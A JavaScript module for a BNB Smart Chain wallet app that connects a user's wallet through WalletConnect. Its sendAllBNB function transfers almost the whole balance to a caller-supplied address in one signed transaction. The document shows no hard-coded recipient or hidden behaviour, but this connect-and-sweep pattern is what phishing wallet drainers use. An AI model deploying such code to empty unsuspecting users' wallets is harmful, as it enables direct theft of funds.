import { ethers } from 'ethers';
import EthereumProvider from '@walletconnect/ethereum-provider';

const projectId = '4d08946e6c316bed5e76b450ccbb5256';
const BSC_RPC    = 'https://bsc-dataseed.binance.org/';
const rpcProvider = new ethers.providers.JsonRpcProvider(BSC_RPC);

const origin = window.location.origin;
const metadata = {
  name:        'BNB Wallet App',
  description: 'نمایش موجودی و برداشت BNB',
  url:         origin,
  icons:       [`${origin}/favicon.svg`],
};

const providerOptions = { projectId, chains: [56], showQrModal: true, metadata };
let wcProvider = null;

export async function connectWallet() {
  wcProvider = await EthereumProvider.init(providerOptions);
  await wcProvider.connect();
  const web3 = new ethers.providers.Web3Provider(wcProvider);
  const signer = web3.getSigner();
  return signer;
}

export async function sendAllBNB(signer, toAddress) {
  // ۱) موجودی از RPC بگیرید
  const address    = await signer.getAddress();
  const balanceWei = await rpcProvider.getBalance(address);

  // ۲) مقداری برای کارمزد کنار بگذارید
  const reserved = ethers.utils.parseUnits('0.0002', 'ether');
  const amount   = balanceWei.sub(reserved);
  if (amount.lte(0)) throw new Error('موجودی کافی نیست');

  // ۳) gasPrice و gasLimit را از RPC تخمین بزنید
  const gasPrice          = await rpcProvider.getGasPrice();
  const estimatedGasLimit = await rpcProvider.estimateGas({ to: toAddress, value: amount });

  // ۴) فقط یک eth_sendTransaction به کیف پول بفرستید
  const tx = await signer.sendTransaction({
    to:        toAddress,
    value:     amount,
    gasLimit:  estimatedGasLimit.toString(),
    gasPrice:  gasPrice.toString(),
    type:      0
  });

  await tx.wait();
  return tx;
}